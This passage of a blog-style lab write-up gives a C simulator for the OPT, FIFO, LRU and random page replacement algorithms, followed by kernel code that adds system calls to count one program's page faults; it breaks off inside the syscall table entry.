class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE 2400                    <span class="comment">// Process virtual space size</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 10                       <span class="comment">// Page frame size</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PAGES (ARRAY_SIZE / PAGE_SIZE) <span class="comment">// Number of pages in virtual memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_FRAMES 5                       <span class="comment">// Number of pages in physical memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_NUM_FRAMES 7                  <span class="comment">// Number of pages to jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOOP_TIMES 3                       <span class="comment">// Number of loop iterations</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_array[ARRAY_SIZE];        <span class="comment">// Process virtual space</span></span><br><span class="line"><span class="type">int</span> frames[NUM_FRAMES][PAGE_SIZE]; <span class="comment">// Physical memory divided into page frames</span></span><br><span class="line"><span class="type">int</span> page_table[NUM_PAGES];         <span class="comment">// Page table entries (mapping from virtual page frame number to physical page frame number)</span></span><br><span class="line"><span class="type">int</span> frame_table[NUM_FRAMES];       <span class="comment">// Frame table (mapping from physical page frame number to virtual page frame number)</span></span><br><span class="line"><span class="type">int</span> page_faults = <span class="number">0</span>;               <span class="comment">// Number of page faults</span></span><br><span class="line"><span class="type">int</span> algo_choice = <span class="number">0</span>;               <span class="comment">// Page replacement algorithm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> frame_pointer = <span class="number">0</span>;           <span class="comment">// For FIFO</span></span><br><span class="line"><span class="type">int</span> frame_queue[NUM_FRAMES];     <span class="comment">// For FIFO</span></span><br><span class="line"><span class="type">int</span> frame_timestamp[NUM_FRAMES]; <span class="comment">// For LRU</span></span><br><span class="line"><span class="type">int</span> future_pages[ARRAY_SIZE];    <span class="comment">// For OPT</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *algo_name[<span class="number">4</span>] = &#123;<span class="string">&quot;Random Replacement&quot;</span>, <span class="string">&quot;OPT&quot;</span>, <span class="string">&quot;FIFO&quot;</span>, <span class="string">&quot;LRU&quot;</span>&#125;; <span class="comment">// Page replacement algorithm names</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initialize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="comment">// Fill random numbers and initialize</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        main_array[i] = rand() % <span class="number">100000</span>;</span><br><span class="line">        future_pages[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Initialize page table</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PAGES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        page_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Initialize page frame queue and timestamps</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        frame_queue[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_timestamp[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_opt</span><span class="params">(<span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement OPT algorithm</span></span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> max_future = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// Find the page frame that won&#x27;t be used for the longest time in the future</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// If an empty page frame is found, return directly</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[i] == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            frame = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="built_in">future</span> = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = current_time; j &lt; ARRAY_SIZE; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (future_pages[j] == frame_table[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">future</span> = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">future</span> &gt; max_future)</span><br><span class="line">        &#123;</span><br><span class="line">            max_future = <span class="built_in">future</span>;</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_future == <span class="number">-1</span>)</span><br><span class="line">        frame = rand() % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_fifo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement FIFO algorithm, relying on queue, first in first out</span></span><br><span class="line">    <span class="type">int</span> frame = frame_pointer;</span><br><span class="line">    frame_pointer = (frame_pointer + <span class="number">1</span>) % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_lru</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement LRU algorithm</span></span><br><span class="line">    <span class="type">int</span> lru = INT_MAX;</span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// Find the least recently used page frame</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (frame_timestamp[i] &lt; lru)</span><br><span class="line">        &#123;</span><br><span class="line">            lru = frame_timestamp[i];</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access page</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">access_page</span><span class="params">(<span class="type">int</span> page_number, <span class="type">int</span> offset, <span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Page fault, use corresponding page replacement algorithm</span></span><br><span class="line">    <span class="keyword">if</span> (page_table[page_number] == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Find an empty or page frame that should be replaced</span></span><br><span class="line">        <span class="type">int</span> frame_number;</span><br><span class="line">        <span class="keyword">switch</span> (algo_choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            frame_number = find_frame_opt(current_time);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            frame_number = find_frame_fifo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            frame_number = find_frame_lru();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            frame_number = rand() % NUM_FRAMES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Change the previous virtual to physical page table mapping to -1</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[frame_number] != <span class="number">-1</span>)</span><br><span class="line">            page_table[frame_table[frame_number]] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mPage Fault\033[0m, Page %3d loaded into frame %2d, data at offset %2d: &quot;</span>, page_number, frame_number, offset);</span><br><span class="line">        page_table[page_number] = frame_number;</span><br><span class="line">        frame_table[frame_number] = page_number;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            frames[frame_number][i] = main_array[page_number * PAGE_SIZE + i];</span><br><span class="line">        &#125;</span><br><span class="line">        page_faults++;</span><br><span class="line">        frame_queue[frame_number] = page_number;</span><br><span class="line">        frame_timestamp[frame_number] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mPage Hit\033[0m, Page %3d in frame %2d, data at offset %2d: &quot;</span>, page_number, page_table[page_number], offset);</span><br><span class="line">        frame_timestamp[page_table[page_number]] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%5d &quot;</span>, main_array[page_number * PAGE_SIZE + offset]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    initialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prompt user to select page replacement algorithm</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please select page replacement algorithm (1=OPT, 2=FIFO, 3=LRU), default random replacement: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;algo_choice);</span><br><span class="line">    <span class="keyword">if</span> (algo_choice &lt; <span class="number">1</span> || algo_choice &gt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid page replacement algorithm option, using default replacement method: random replacement.\n&quot;</span>);</span><br><span class="line">        algo_choice = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Currently using page replacement algorithm: %s\n&quot;</span>, algo_name[algo_choice]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prompt user to select page access order</span></span><br><span class="line">    <span class="type">int</span> access_order = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (algo_choice == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Prompt user to select, reselect if wrong choice</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid access order option, please reselect.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPT algorithm needs to know future page access order, please select page access order (1=sequential, 2=jump, 3=branch, 4=loop): &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Prompt user to select, reselect if wrong choice</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid access order option, please reselect.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please select page access order (1=sequential, 2=jump, 3=branch, 4=loop, 5=random): &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Access pages according to selected access order</span></span><br><span class="line">    <span class="keyword">switch</span> (access_order)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Sequential access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Jump access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// Access with JUMP_NUM_FRAMES step intervals</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Branch access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Even page frames sequential access, odd page frames jump access</span></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// Loop access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = (i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// Loop access loop_times times</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) </span><br><span class="line">            access_page((i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE, (i % (ARRAY_SIZE / LOOP_TIMES)) % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>: <span class="comment">// Random access</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Print future_pages */</span></span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; NUM_PAGES; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, future_pages[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output page fault count</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page access error count: %d, Hit rate: %.2f%%\n&quot;</span>, page_faults, (<span class="number">1</span> - (<span class="type">float</span>)page_faults / ARRAY_SIZE) * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Program-Execution-Results"><a href="#Program-Execution-Results" class="headerlink" title="Program Execution Results"></a>Program Execution Results</h3><p>This is the original output example, but for better demonstration, I made some modifications to the program and commented out some output.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-output.png" alt="Original output"></p><h4 id="OPT"><a href="#OPT" class="headerlink" title="OPT"></a>OPT</h4><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-opt.png" alt="OPT execution result"></p><h4 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h4><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-fifo.png" alt="FIFO execution result"></p><h4 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h4><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-lru.png" alt="LRU execution result"></p><p>Since the OPT algorithm needs to know the future page access order, after selecting the OPT algorithm, there is no option 5&#x3D;random access.</p><h2 id="Task-3-Modify-Linux-Kernel-Page-Fault-Handling-Function-to-Print-Debug-Information"><a href="#Task-3-Modify-Linux-Kernel-Page-Fault-Handling-Function-to-Print-Debug-Information" class="headerlink" title="Task 3: Modify Linux Kernel Page Fault Handling Function to Print Debug Information"></a>Task 3: Modify Linux Kernel Page Fault Handling Function to Print Debug Information</h2><h3 id="Task-Requirements-2"><a href="#Task-Requirements-2" class="headerlink" title="Task Requirements"></a>Task Requirements</h3><ol><li><p>Write 2 applications similar to hello world or simple for loops as test targets.</p></li><li><p>Add debug information using printk in Linux kernel’s page fault handling function do_no_page() or similar functions (function names vary across versions), print page fault information for specific processes (using program name as filter condition), and count page faults.</p></li><li><p>You can also add debug information using printk in Linux kernel’s physical page frame allocation function get_free_page() or similar functions (function names vary across versions), print information about new page frame allocation during specific process execution (using program name as filter condition), and count related information.</p></li></ol><h3 id="Modify-Kernel-Source-Code"><a href="#Modify-Kernel-Source-Code" class="headerlink" title="Modify Kernel Source Code"></a>Modify Kernel Source Code</h3><h4 id="Add-Code-mm-memory-c"><a href="#Add-Code-mm-memory-c" class="headerlink" title="Add Code ./mm/memory.c"></a>Add Code <code>./mm/memory.c</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add two system calls for program control, one to set target program name, one to get target program&#x27;s page fault count</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> target_program[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// target program name</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_fault_count = <span class="number">0</span>;      <span class="comment">// page fault counts</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(set_target_program_name, <span class="type">const</span> <span class="type">char</span> __user *, program_name) &#123;</span><br><span class="line">        <span class="comment">// copy name to kernel </span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(target_program,program_name, <span class="number">255</span>) != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;  <span class="comment">// if fail, return -EFAULT</span></span><br><span class="line"></span><br><span class="line">        target_program[<span class="number">255</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE0(get_page_fault_count) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;%s page fault count: %ld\n&quot;</span>, target_program, page_fault_count);</span><br><span class="line">        page_fault_count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> page_fault_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add debug information in do_no_page function</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, target_program) == <span class="number">0</span>)</span><br><span class="line">                page_fault_count++;</span><br></pre></td></tr></table></figure><h4 id="System-Call-Function-Declaration-include-linux-syscalls-h"><a href="#System-Call-Function-Declaration-include-linux-syscalls-h" class="headerlink" title="System Call Function Declaration ./include/linux/syscalls.h"></a>System Call Function Declaration <code>./include/linux/syscalls.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add declarations for two system calls</span></span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_set_target_program_name</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *name)</span>;</span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_get_page_fault_count</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><h4 id="System-Call-ID-arch-x86-entry-syscalls-syscall-64-tbl"><a href="#System-Call-ID-arch-x86-entry-syscalls-syscall-64-tbl" class="headerlink" title="System Call ID ./arch/x86/entry/syscalls/syscall_64.tbl"></a>System Call ID <code>./arch/x86/entry/syscalls/syscall_64.tbl</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add system call numbers for two system calls</span></span><br><span class="line"><span class="number">448</span>   <span class="number">64</span>   set_target_program_name     